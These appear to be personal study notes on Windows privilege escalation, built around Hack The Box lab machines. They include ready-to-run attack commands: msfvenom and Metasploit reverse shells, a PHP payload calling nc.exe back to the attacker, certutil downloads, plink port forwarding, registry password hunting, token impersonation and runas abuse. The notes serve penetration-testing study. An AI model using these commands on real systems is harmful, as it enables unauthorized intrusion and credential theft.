
## Important resources
 Windows Privilege Escalation Fundamentals
https://fuzzysecurity.com/tutorials/16.html

Payload all the things windows priv esc
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Asolomb blog

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant blog
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

# Gaining a foothold

He watched the port 21 and 80 opened. He is going to try to upload a malicious file on the 21 port and execute it on the web server.

Connection
`ftp 10.10.10.5` 

(metasploit chets heet reverse shell on google)
He did it just with a msfvenom payload meterpreter.

`put exploit.aspx`


Then he just use metasploit


1- `use exploit/multi/handler`
2- `set payload windows/meterpreter/reverse_tcp
3- `options` set lhost tun0 (or the ip)
4- `run`

Then execute the exploit on the website.

On the machine:

`getuid`
(returns the server username)
`sysinfo`
Gives data about the system , OS, etc.

execute the command `shell` and the terminal will be like a shell

`c:\windows\system32\inetsrv`


# Initial enumeration

##### System enumeration:

```
c:\> systeminfo 
```
Retrieves a lot of system info, OS ,memory , language, etc.

Similar to grep:

```
c:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Returns the hostname
```
c:\> hostname
```


This command shows the patches of the system

wmic= windows management  instrumentation commandline
qfe=quick fix engineering 

```
c:\> wmic qfe 
```


![[Screenshot_2023-10-26_21_21_25.png]]
kbid=knowledge base id (kbid)


This filters the content:
```
C:\>wmic qfe get Caption,Descriptiom,HotFixID,InstalledOn
```
See logical discs (if there is another):

```
wmic logicaldisk
```
The output is not so clean. So it is better watch it with this command:
```
wmic logicalisk get caption,description,providername
```

#### User enumeration

This command shows my actual user
```
C:\>whoami
```

This command shows my priviledges 

```
C:\>whoami /priv
```

This command shows groups:

```
C:\>whoami /groups
```

This shows the users on this machine:

```
C:\> net user
```

This can show info about some user that you point on

```
C:\> net user babis
```

Other command that I can see the net local groups:

```
C:\> net localgroup
```

And I can watch particular groups 

```
C:\> net localgroup administrators
```

#### Network Enumeration

The most obvious one:

```
C:\> ipconfig

Detailed:

C:\> ipconfig /all

```

To see the arp tables:

```
C:\> arp -a
```

This shows the routing table:

```
C:\> route print
```

See the active ports

```
C:\> netstat -ano
```

See configuration of firewall , if you can bypass it pretending that you are using a legitimate traffic

```
C:\> netsh advfirewall firewall dump
```
On older distributions works this another command that shows if it's on or off:

```
C:\> netsh firewall show state
```

This shows the configuration
```
C:\> netsh firewall show configu
```

#### Password Hunting

This searches from the folder that you specify if the string "passw" is contained, and is looking on extensions like txt ini and config
```
C:\> findstr /si passw *.txt *.ini *.config
```


Search more on payload all the things, there are examples like the wifi password on plaintext


#### AV & Firewall Enumeration 

Search for the status of te AV ( sc = service control)

```
C:\> sc query windefend
```

This shows all the services that are running on the machine , this can be helpful to identify another AV running

```
C:\> sc queryex type=service
```

####

Another :

Shows credentials
`C:\> cmdkey /list`


# Exploring automated tools for enumeration

![[Screenshot_2023-10-27_09_58_27.png]]

Note: sometimes Winpeas.exe do not work, so I can try with winpeas.bat.

Watson.exe (looks for CVE's)

Another one that is not on the picture seatbelt you have to compile it.


###### Downloading Winpeas to the victim machine with metasploit

Go to the temp folder
```
meterpreter> cd :c\\windows\\temp
```
Now upload the file
```
meterpreter > upload /path/to/winpeas/WinPeas.exe
```
Then  execute it with a shell.

Change from a Shell to a Powershell:

```
C:\> powershell -ep bypass
```
Another way  on the meterpreter:

```
meterpreter> load powershell
```

If this doesn't work try other tools

##### Windows exploit suggester on metasploit

Here we are using one with metasploit
```
meterpreter> run post/multi/recon/local_exploit_suggester
```
This will give you a lot of info.

Another tool, that we can find vulnerabilities but more updated ones:

##### Windows exploit suggester.py (from an updated db)


1-First copy all the data from systeminfo save it on sysinfo.txt
2-Download the windows-exploit-suggester.py
3- run this command
```
./windows-exploit-suggester.py --update
```
4-run this command
```
./windows-exploit-suggester.py --database (paste the --update output here) --systeminfo sysinfo.txt
```



# Escalation path: Kernel Exploits
### Kernel exploits overview

There is a git repository kernel exploits
https://github.com/SecWiki/windows-kernel-exploits

#### Metasploit

- 1 Select an exploit from a list, that you retrieve from the enumeration
- 2 Tip `background` 
- 3 Tip `use exploit/windows/local/<put_here_the_exploit>`
- 4 Tip `options` put the session, host, and the options. 
- 5 `run`the exploit
- 6 put `getuid` and execute the shell or powershell 
### Manual
- 1 `msfvenom -p windows/shell_reverse_tcp LHOST=<my-ip> LPORT=443 -f aspx > manual.aspx`
- 2 Execute the payload before listening with netcat first.
- 3 Download the payload to the machine or the enumeration machine
- 4 `python3 -m http.server 80` or `python -m SimpleHTTPServer 80`
- 5 Download it with `certutil -urlcache -f http://<ip>:<port>/file filename

# Escalation Path: Passwords and port forwarding

Escalation via Stored Passwords

- 1 Watch the video for more detailed info of  the foothold.
- 2 Do an enumeration.
- 3 Analyze the ports
![[Screenshot_2023-10-27_12_01_05.png]]
The ports that are on 0.0.0.0 are ports that are only visible locally 

- 4 Now he is watching for credentials for the port 445 (smb) and is looking it on the registry. More info about where find passowrds look the shushart cheatsheet. This is the command: `reg query HKLM /f password /t REG_SZ /s `


  Here he found `Welcome!`


- 5 
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon`

  This will show a username too in this case 
  `Alfred` and the password `Welcome1!` 

- 6 Now he is going to see if the credentials corresponds to the smb. Using port forward with a tool. (Plink.exe). Then he transmited the tool to the windows victim machine.

- 7 On the kali machine apt-install ssh

- 8 gedit /etc/ssh/sshd_config. Change the "PermitRootLogin to 'yes' "

- 9 ssh service restart


- 10 service ssh start


- 11 Now on the victim machine tip `plink.ex -l root -pw <password> -R 445:127.0.0.1:445 <my-ip> ` -R means port forwarding command.  This will execute a shell on the victim machine, that will redirect me to my own machine (crazy)


- 12 tip `netstat -ano | grep 445`


- 13 Use winexe, this permites execute windows comand on a linux machine 

`ẁinexe -U administrator%Welcome1! //127.0.0.1 "cmd.exe"`
Push many enters and he get the shell.

So why this worked ? I think because here on this example the user Alfred has configured the machine, and he has the same passowrd of the Administrator of the machine. When I configured my machine on windows generally do this, I use the same password of my user.
### Windows subsystem for linux


###### Escalation via WSL


Look the cheatsheet about the privilege scalation on WSL linux subsystem on windows.


(Sec notes machine on htb)
After he find the credentials : on the foothold he used "psexec.py" I dont know this tool
On smbclient he used another strage thing
(why new site)
```
smbclient \\\\10.10.10.97\\new-site -U tyler 
```
He put nc.exe on the server from smbclient `put nc.exe` and he put  a malicious php payload `<?php system('nc.exe -e cmd.exe <my-ip> 4444') ?>` Both on with the smbclient

Privilege scalation:

Find the bash.exe file , you can use find too instead of where

`where /R c:\windows bash.exe` 

The output

`C\:> the\location\bash.exe

or finding the wsl.exe

`where /R c:\windows wsl.exe` 

Then try whoami and it returns root

`where /R c:\windows wsl.exe whoami`

tty scape cheat sheet 
https://steflan-security.com/linux-tty-shell-cheat-sheet/

When he had a pty he just used "history" and was able to see this on the list of historical commands

```
18 smbclient -U 'administrator%password%·$%13!' \\\\127.0.0.1\\c$
```
With this  command we can connect to the machine, just changing the ip to the victim one. 

But to get a real shell he will use 'impacket'

First step (the antivirus blocks this)
```
psexec.py administrator:'password%·$%13!'@10.10.10.97
```
This work to get a shell 
```
smbexec.py administrator:'password%·$%13!'@10.10.10.97
```





### Impersonation   & potato attacks

###### Token impersonation overview
![[Pasted image 20231027215624.png]]

This seems to be important on active directory , but It may be usable on other contexts. 

On metasploit an example is 
`meterpreter> list_tokens -u`

`meterpreter > impersonate_token MARVEL\\administrator`

He says that using "mimikatz" In an active directory perspective I can be able to retrieve a lot of information (see commands of mimikatz Invoke-Mimikatz)


##### Impersonation privileges Overview

You can see a lot with `get user /priv
And then watch on payload all the things for the "impersonation privileges"

###### Potato Attacks Overview
Important source:
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

##### Escalation via Potato Attack
Jenkins machine

Foothold:

With gobuster he discovered this jenkins server.
```
10.10.10.63/50000/askjeeves
```
This server jenkins has a script console, that runs groovy languaje.

So a quick search for a reverse shell gives the foothold

User:

`C:\> whoami /priv `

Impersonate privilege is on.

See the system info
```
Systeminfo
```
Then copy the output and use windows exploit suggester 

```
./windows-exploit-suggester.py --database file.txt --sysinfo file.txt  (see the command on the enumeration section)
```
He is going to perform a potato attack via metasploit.

```
msf> use exploit/multi/script/web_delivery
```
Show targets:
```
set target 2

Select powershell

set payload windows/meterpreter/reverse_tcp
set lport=
setlhost=
set srvhost=

```

Like this
![[Screenshot_2023-10-28_13_04_45.png]]

Put run and it will give a command that  I need to put on the terminal of the jenkins server

Then do the enumeration of vulnerabilities. `run post/multi/recon/local_exploit_suggester`

Root:
Put the session on background
```
meterpreter > background
```
select the exploit
use .. bla bla bla exploit
```
msf> exploit( windows/local/ms16_075_reflection)
```
Show options , set the options and run.

now he lists the tokens with `list_tokens -u`

and then copy and  use

meterpreter > `impersonate_token (TOKEN)`

The root flag wasn't on the desktop so he explains this (is talking about alternate data streams):

`meterpreter > dir /R`
the file

`more < thefile:$DATA
FLAG
###### Alternate Data Streams

https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams



# Escalation path: Getsystem

What happens when I type getsystem:
https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem

This is on metasploit. 
![[Screenshot_2023-10-28_13_31_40.png]]
Be carefull with the second option, try to not run it

# Escalation path: RunAs

Escalation via run as

https://protegermipc.net/2018/09/05/ejemplos-uso-del-comando-runas-en-windows/

HTB: Acess




Foothold:
He used a command `binary`on the ftp port open. Downloaded two files  from the machine.

To read the mdb file he used `mdb-sql backup.mdb` or `readpst` 

An email. file with credentials.

Root
Connect via telnet
`telnet -l security 10.10.10.98`  

Next:

`cmdkey /list`

![[Screenshot_2023-10-28_13_57_08.png]]
```
C:\Users\<user>\>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\USERS\<user>\root.txt"
```


# Escalation Path: Registry

https://www.youtube.com/watch?v=sb9npkEwWcg

Overview of autoruns
Escalation via autorun
AlwaysInstallELevated Overview and Escalation
Overview regsvc ACL
regsvc Escalation

# Escalation Path: Executable Files

https://www.youtube.com/watch?v=YddtA7o8jVQ

Executable files overview
Escalation via Executable Files

# Escalation Path: Startup Applications

Startup Applications Overview

https://www.youtube.com/watch?v=CZWyp8AKeGk

There are apparently applications that starts when we run the OS, and it help to automate tasks.

Escalation via Startup Applications

Here, we must see first if we have permissions to create a new startup app , and then create one and try to get to the system.

Seems like he uses a tool called acceschk.exe



Some search about this acceschk.exe /acceptula

https://www.google.com/search?q=accesschk.exe+%2Faccepteula&sca_esv=577481235&ei=wVU9ZaiCFNbC5OUP18CtqAU&oq=acceschk.exe&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGFjY2VzY2hrLmV4ZSoCCAEyBxAAGA0YgAQyBhAAGB4YDTIGEAAYHhgNMgYQABgeGA0yBhAAGB4YDTIGEAAYHhgNMgYQABgeGA0yBhAAGB4YDTIGEAAYHhgNMgYQABgeGA1ImzJQAFipKHAAeAGQAQCYAZ0BoAGHCqoBAzYuNrgBA8gBAPgBAcICCBAAGIAEGLEDwgIREC4YgAQYsQMYgwEYxwEY0QPCAgUQABiABMICBRAuGIAEwgILEAAYigUYsQMYgwHCAg4QLhiABBixAxjHARjRA8ICCxAuGIAEGMcBGNEDwgILEC4YigUYsQMYgwHCAgsQABiABBixAxiDAcICBBAAGAPCAhoQLhiKBRixAxiDARiXBRjcBBjeBBjgBNgBAcICBxAAGIoFGEPCAhYQLhiKBRixAxiDARjJAxjHARjRAxhDwgIIEAAYigUYkgPCAgoQABiKBRixAxhDwgILEC4YgAQYxwEYrwHCAgcQABiABBgKwgIJEAAYExiABBgKwgIJEAAYHhjxBBgK4gMEGAAgQYgGAboGBggBEAEYFA&sclient=gws-wiz-serp

# Escalation Path: DLL Hijacking

Overview and Escalation via DLL Hijacking

Dlls are files that the executables uses for run a file. Windows microsoft uses this to run many of their programs. They are similar to libraries and a executable can use the same dll file that other executable use, so there is a improvement of resources.

##### Attacks: 
Injecting dll code on the file

File injection

Dll hijacking



https://www.youtube.com/watch?v=uDiOm1cO0f0



# Escalation Path: Service Permissions (Paths)



This is some guide about priv esc via misconfigured services
https://pswalia2u.medium.com/windows-privilege-escalation-via-misconfigured-services-ea4c01cac89c





Escalatio via BInary Paths
Escalation via Unquited Service Paths
Challenge Overview 
Gainin a Foothold
Escalation via Unquoted Service Path Metasploit

# Escalation Path: CVE-2019-1388

Overview of CVE-2019-1388

Escalation via CVE 2019-1388
### Conclusion 



COMPLEMENTARY VIDEOS WITH MORE THINGS
https://www.youtube.com/watch?v=EUUJWKTPq4k&list=PL-hP6aTHaW0Ng6WRLrQio5X5Yat_wWtau